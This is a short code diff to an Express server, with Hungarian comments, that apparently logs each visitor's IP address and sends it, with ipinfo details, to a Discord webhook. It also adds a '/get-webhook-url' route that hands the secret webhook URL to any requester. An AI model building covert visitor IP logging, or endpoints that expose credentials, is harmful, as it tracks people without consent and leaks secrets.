@@ -1,6 +1,8 @@
+// server.js
+
 const express = require('express');
 const axios = require('axios');
-require('dotenv').config();
+require('dotenv').config(); // Környezeti változók betöltése
 const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
@@ -12,6 +14,12 @@ app.use(express.static(path.join(__dirname, 'public')));
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
+// /get-webhook-url útvonal a webhook URL elküldéséhez
+app.get('/get-webhook-url', (req, res) => {
+    res.json({ webhookUrl });
+});
+
+// /send-ip útvonal
 app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
@@ -47,6 +55,7 @@ app.get('/send-ip', async (req, res) => {
     }
 });
 
+// Alapértelmezett útvonal, hogy kiszolgálja az index.html-t
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
